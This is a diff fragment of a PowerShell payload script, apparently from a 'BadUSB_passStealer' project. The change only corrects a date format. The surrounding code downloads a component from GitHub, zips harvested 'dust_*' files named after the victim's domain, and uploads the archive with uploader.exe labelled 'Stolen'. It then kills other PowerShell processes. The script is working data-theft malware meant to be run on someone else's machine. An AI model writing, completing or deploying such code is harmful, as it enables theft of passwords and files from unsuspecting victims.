@@ -11,7 +11,7 @@ Invoke-WebRequest https://github.com/lshaf/BadUSB_passStealer/blob/main/other_fi
 Start-Sleep -Seconds 10 #Wait for 60 seconds (because connected devices file take a minute to be created)
 Compress-Archive dust_* "$env:UserDomain$(Get-Date -Format yyyyMMdd).zip"
 Start-Sleep -Seconds 5
-.\uploader.exe -f "$env:UserDomain$(Get-Date -Format yyyyMMdd).zip" -c "Stolen $env:UserDomain on $(Get-Date -Format yyyy-mm-dd)"
+.\uploader.exe -f "$env:UserDomain$(Get-Date -Format yyyyMMdd).zip" -c "Stolen $env:UserDomain on $(Get-Date -Format yyyy-MM-dd)"
 Start-Sleep -Seconds 20 #Wait for 60 seconds (because connected devices file take a minute to be created)
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 15 #Wait 30 seconds
